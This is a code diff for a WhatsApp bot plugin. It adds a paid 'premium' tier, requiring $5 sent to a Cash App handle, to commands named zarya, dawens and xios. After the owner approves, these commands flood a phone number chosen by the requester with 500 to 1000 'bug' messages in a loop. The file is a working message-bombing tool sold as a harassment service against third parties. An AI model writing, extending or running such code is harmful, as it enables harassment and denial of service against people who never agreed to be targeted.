@@ -1,60 +1,70 @@
 const { cmd } = require('../command');
 const store = {};
+const premium = {};
 const OWNER_NUMBER = '50942241547@s.whatsapp.net';
 
 function delay(ms) {
   return new Promise(res => setTimeout(res, ms));
 }
 
+function addBugCommand(name, desc, count) {
+  cmd({
+    pattern: name,
+    desc: desc,
+    category: 'bug',
+    filename: __filename,
+  }, async (conn, m, { args, reply }) => {
+    const sender = m.sender;
+
+    if (sender !== OWNER_NUMBER && !premium[sender]) {
+      return reply(`💵 Send $5 to use this command:\nhttps://cash.app/$berryxoe\n\nOnce paid, wait for confirmation.`);
+    }
+
+    const number = args[0];
+    if (!number) return reply(`❌ Example: .${name} 13057487562`);
+    const target = number + '@s.whatsapp.net';
+    
+    store[m.key.id] = { target, count, sender };
+
+    await conn.sendMessage(OWNER_NUMBER, {
+      text: `⚠️ @${sender.split('@')[0]} requested *${name.toUpperCase()} bug*\nTarget: ${number}\n\n🆔 ID: ${m.key.id}\nReply:\n✅ yes ${m.key.id}\n❌ no ${m.key.id}`,
+      mentions: [sender]
+    }, { quoted: m });
+  });
+}
+
+addBugCommand('zarya', 'Send ZARYA bug (500)', 500);
+addBugCommand('dawens', 'Send DAWENS bug (800)', 800);
+addBugCommand('xios', 'Send XIOS bug (1000)', 1000);
+
 cmd({
-  pattern: 'zarya',
-  desc: 'Voye ZARYA bug (500 messages)',
-  category: 'bug',
+  pattern: 'accept',
+  desc: 'Confirm payment',
+  category: 'owner',
   filename: __filename,
 }, async (conn, m, { args, reply }) => {
   const number = args[0];
-  if (!number) return reply('❌ Egzanp: *.zarya 13057487562*');
-  const target = number + '@s.whatsapp.net';
-  store[m.sender] = { target, count: 500 };
+  if (!number) return reply('Example: .accept 50942240000');
 
-  await conn.sendMessage(OWNER_NUMBER, {
-    text: `📩 @${m.sender.split('@')[0]} vle voye ZARYA bug sou:\n*${number}*\n\n✅ *Reponn:* yes oswa no`,
-    mentions: [m.sender]
-  }, { quoted: m });
+  const jid = number + '@s.whatsapp.net';
+  premium[jid] = true;
+  await reply(`✅ ${number} is now premium.`);
+  await conn.sendMessage(jid, { text: `🎉 You are now premium. You can use all commands.` });
 });
 
 cmd({
-  pattern: 'dawens',
-  desc: 'Voye DAWENS bug (800 messages)',
-  category: 'bug',
+  pattern: 'remove',
+  desc: 'Remove premium',
+  category: 'owner',
   filename: __filename,
 }, async (conn, m, { args, reply }) => {
   const number = args[0];
-  if (!number) return reply('❌ Egzanp: *.dawens 13057487562*');
-  const target = number + '@s.whatsapp.net';
-  store[m.sender] = { target, count: 800 };
+  if (!number) return reply('Example: .remove 50942240000');
 
-  await conn.sendMessage(OWNER_NUMBER, {
-    text: `📩 @${m.sender.split('@')[0]} mande *DAWENS bug* sou:\n*${number}*\n\n✅ Reponn: yes oswa no`,
-    mentions: [m.sender]
-  }, { quoted: m });
-});
-
-cmd({
-  pattern: 'xios',
-  desc: 'Voye XIOS bug (1000 messages)',
-  category: 'bug',
-  filename: __filename,
-}, async (conn, m, { args, reply }) => {
-  const number = args[0];
-  if (!number) return reply('❌ Egzanp: *.xios 13057487562*');
-  const target = number + '@s.whatsapp.net';
-  store[m.sender] = { target, count: 1000 };
-
-  await conn.sendMessage(OWNER_NUMBER, {
-    text: `📩 @${m.sender.split('@')[0]} mande *XIOS bug* sou:\n*${number}*\n\n✅ Reponn: yes oswa no`,
-    mentions: [m.sender]
-  }, { quoted: m });
+  const jid = number + '@s.whatsapp.net';
+  delete premium[jid];
+  await reply(`❌ ${number} removed from premium.`);
+  await conn.sendMessage(jid, { text: `Your premium access has been removed.` });
 });
 
 conn.ev.on('messages.upsert', async ({ messages }) => {
@@ -62,20 +72,18 @@ conn.ev.on('messages.upsert', async ({ messages }) => {
   if (!m.message?.conversation) return;
 
   const from = m.key.remoteJid;
-  const isOwner = from === OWNER_NUMBER;
+  if (from !== OWNER_NUMBER) return;
 
-  if (!isOwner) return;
+  const text = m.message.conversation.toLowerCase().trim();
+  const [status, id] = text.split(' ');
 
-  const text = m.message.conversation.toLowerCase();
+  if (status !== 'yes' && status !== 'no') return;
 
-  if (text === 'yes') {
-    const entry = Object.entries(store)[0];
-    if (!entry) return await conn.sendMessage(from, { text: '⛔ Pa gen demann aktyèl.' });
+  const data = store[id];
+  if (!data) return await conn.sendMessage(from, { text: 'No pending request for this ID.' });
 
-    const [requester, data] = entry;
-    delete store[requester];
-
-    await conn.sendMessage(from, { text: `🚀 Voye ${data.count} bug...` });
+  if (status === 'yes') {
+    await conn.sendMessage(from, { text: `Sending ${data.count} bugs to ${data.target}...` });
 
     for (let i = 0; i < data.count; i++) {
       await conn.sendMessage(data.target, {
@@ -84,13 +92,10 @@ conn.ev.on('messages.upsert', async ({ messages }) => {
       });
     }
 
-    await conn.sendMessage(from, { text: '✅ Zarya bug successfully ✨💀' });
-
-  } else if (text === 'no') {
-    const entry = Object.entries(store)[0];
-    if (!entry) return;
-    const [requester] = entry;
-    delete store[requester];
-    await conn.sendMessage(from, { text: '❌ Bug refize.' });
+    await conn.sendMessage(from, { text: 'Done.' });
+  } else {
+    await conn.sendMessage(from, { text: 'Request denied.' });
   }
+
+  delete store[id];
 });
